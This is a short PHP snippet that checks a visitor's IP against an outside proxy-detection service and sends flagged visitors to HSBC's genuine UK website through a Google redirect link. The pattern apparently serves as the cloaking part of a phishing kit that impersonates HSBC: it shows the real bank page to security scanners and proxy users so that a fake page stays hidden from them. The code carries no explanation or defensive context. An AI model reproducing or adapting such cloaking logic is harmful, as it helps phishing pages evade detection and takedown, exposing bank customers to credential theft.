<?php

# Visitor proxy check snippet

$v_ip = $_SERVER['REMOTE_ADDR'];
$arContext['http']['timeout'] = 10;
$context = stream_context_create($arContext);

$response = file_get_contents('http://www.shroomery.org/ythan/proxycheck.php?ip='.$v_ip, 0, $context);

if ($response == 'Y') {

        header("Location: https://www.google.ie/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwjl7oHQx6fLAhUBvRoKHUIGAvkQFggbMAA&url=https%3A%2F%2Fwww.hsbc.co.uk%2F&usg=AFQjCNHgssL48GufX82hDefuAgLxFpYtvg&bvm=bv.115339255,d.d2s");
		die();
}

?>